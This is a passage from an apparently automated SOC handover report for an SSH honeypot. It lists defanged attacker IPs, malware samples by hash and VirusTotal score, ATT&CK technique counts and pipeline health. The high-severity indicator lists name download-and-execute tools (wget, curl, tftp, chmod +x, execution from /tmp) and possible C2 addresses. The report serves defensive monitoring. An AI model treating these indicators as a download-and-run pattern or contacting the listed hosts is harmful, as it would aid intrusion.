| `152.32.131[.]10` | **8** | 2026-07-06 10:57 | 2026-07-06 10:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | **5** | 2026-07-06 06:55 | 2026-07-06 09:37 | 5m | 0 | `T1592` | 🟢 LOW |
| `34.78.205[.]103` | **5** | 2026-07-06 08:17 | 2026-07-06 08:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]100` | **5** | 2026-07-06 09:44 | 2026-07-06 09:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]84` | **5** | 2026-07-06 09:36 | 2026-07-06 09:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.24.63[.]85` | **4** | 2026-07-06 09:20 | 2026-07-06 09:28 | 6m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]89` | **4** | 2026-07-06 09:43 | 2026-07-06 09:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | **3** | 2026-07-06 07:00 | 2026-07-06 08:19 | 1m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]142` | **3** | 2026-07-06 09:43 | 2026-07-06 09:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]90` | **3** | 2026-07-06 08:15 | 2026-07-06 08:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]6` | **3** | 2026-07-06 11:51 | 2026-07-06 12:36 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.37.79[.]201` | **2** | 2026-07-06 11:38 | 2026-07-06 11:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `154.90.70[.]254` | **2** | 2026-07-06 12:04 | 2026-07-06 12:04 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-06 07:06 | 2026-07-06 07:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | **2** | 2026-07-06 07:13 | 2026-07-06 07:24 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.156.98[.]194` | **2** | 2026-07-06 10:34 | 2026-07-06 10:36 | 2m | 0 | `T1592` | 🟢 LOW |
| `64.89.162[.]15` | **2** | 2026-07-06 07:54 | 2026-07-06 07:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.141[.]163` | 1 | 2026-07-06 12:32 | 2026-07-06 12:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.57.243[.]186` | 1 | 2026-07-06 12:34 | 2026-07-06 12:34 | 26s | 0 | `T1592` | 🟢 LOW |
| `118.196.38[.]83` | 1 | 2026-07-06 08:03 | 2026-07-06 08:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.27.128[.]176` | 1 | 2026-07-06 10:24 | 2026-07-06 10:24 | 3s | 0 | `T1592` | 🟢 LOW |
| `120.48.106[.]235` | 1 | 2026-07-06 12:03 | 2026-07-06 12:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.105[.]40` | 1 | 2026-07-06 12:50 | 2026-07-06 12:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]226` | 1 | 2026-07-06 11:08 | 2026-07-06 11:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `163.61.39[.]40` | 1 | 2026-07-06 12:22 | 2026-07-06 12:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `171.211.125[.]105` | 1 | 2026-07-06 09:23 | 2026-07-06 09:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.204.181[.]248` | 1 | 2026-07-06 08:09 | 2026-07-06 08:09 | 30s | 0 | `T1592` | 🟢 LOW |
| `18.97.26[.]1` | 1 | 2026-07-06 12:12 | 2026-07-06 12:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.103.119[.]98` | 1 | 2026-07-06 07:53 | 2026-07-06 07:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `2.58.172[.]185` | 1 | 2026-07-06 07:47 | 2026-07-06 07:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.58.172[.]185` | 1 | 2026-07-06 10:12 | 2026-07-06 10:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.58.172[.]185` | 1 | 2026-07-06 12:37 | 2026-07-06 12:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]79` | 1 | 2026-07-06 09:50 | 2026-07-06 09:50 | 6s | 0 | `T1592` | 🟢 LOW |
| `219.151.148[.]162` | 1 | 2026-07-06 10:07 | 2026-07-06 10:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `27.155.120[.]135` | 1 | 2026-07-06 10:34 | 2026-07-06 10:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `34.156.75[.]163` | 1 | 2026-07-06 08:09 | 2026-07-06 08:09 | 6s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-07-06 09:33 | 2026-07-06 09:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-07-06 11:45 | 2026-07-06 11:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `50.116.26[.]161` | 1 | 2026-07-06 12:34 | 2026-07-06 12:34 | 1s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-07-06 12:51 | 2026-07-06 12:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-06 07:06 | 2026-07-06 07:07 | 54s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-06 09:31 | 2026-07-06 09:31 | 35s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]108` | 1 | 2026-07-06 08:53 | 2026-07-06 08:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]80` | 1 | 2026-07-06 11:16 | 2026-07-06 11:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.240.236[.]116` | 1 | 2026-07-06 07:20 | 2026-07-06 07:20 | 10s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]20` | 1 | 2026-07-06 10:27 | 2026-07-06 10:28 | 8s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-06 10:26 | 2026-07-06 10:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-06 12:48 | 2026-07-06 12:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.60[.]98` | 1 | 2026-07-06 12:33 | 2026-07-06 12:33 | 30s | 0 | `T1592` | 🟢 LOW |
| `8.153.70[.]222` | 1 | 2026-07-06 10:20 | 2026-07-06 10:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]185` | 1 | 2026-07-06 11:10 | 2026-07-06 11:10 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]104` | 1 | 2026-07-06 11:08 | 2026-07-06 11:08 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]105` | 1 | 2026-07-06 11:08 | 2026-07-06 11:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]110` | 1 | 2026-07-06 11:08 | 2026-07-06 11:08 | 10s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]193` | 1 | 2026-07-06 11:10 | 2026-07-06 11:10 | 4s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]2` | 1 | 2026-07-06 11:08 | 2026-07-06 11:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]176` | 1 | 2026-07-06 11:28 | 2026-07-06 11:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `95.165.77[.]31` | 1 | 2026-07-06 07:46 | 2026-07-06 07:48 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **37/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a6fbbdec757b0fe91ea18dc3d9f7b379c18ca49eeef63afaea8da3c9385b1049` | ELF Binary (Linux executable) (x86-64 64-bit) | `a6fbbdec757b0fe9...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `2.58.172[.]185` | GB | rack400.com - UK Infrastructure Tel : +6531595852 | **100** ⚠️ | 1 |
| `157.173.104[.]13` | FR | Contabo GmbH | **100** ⚠️ | 4 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `66.132.195[.]89` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `120.48.106[.]235` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 28 |
| `34.53.187[.]0` | BE | Google LLC | **100** ⚠️ | 0 |
| `51.158.205[.]203` | NL | Scaleway - Amsterdam, Netherlands | **100** ⚠️ | 50 |
| `57.128.225[.]99` | PL | OVH Sp. z o. o. | **100** ⚠️ | 47 |
| `164.92.115[.]22` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `175.204.181[.]248` | KR | Korea Telecom | **100** ⚠️ | 32 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 458 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 419 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 84 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 83 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 82 |

---

## 🔕 False Positive Summary (8 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 987 cases |
| Tool 34  | Credential Extractor        | ✅ 480 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 23 fingerprints |
| Tool 36  | Command Clustering          | ✅ 12 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 107 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 8 filtered (0.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 64 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 416 priority case(s) shown individually · 67 recon entry/entries in table (26 group(s) consolidating 522 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-06T13:51:25Z_
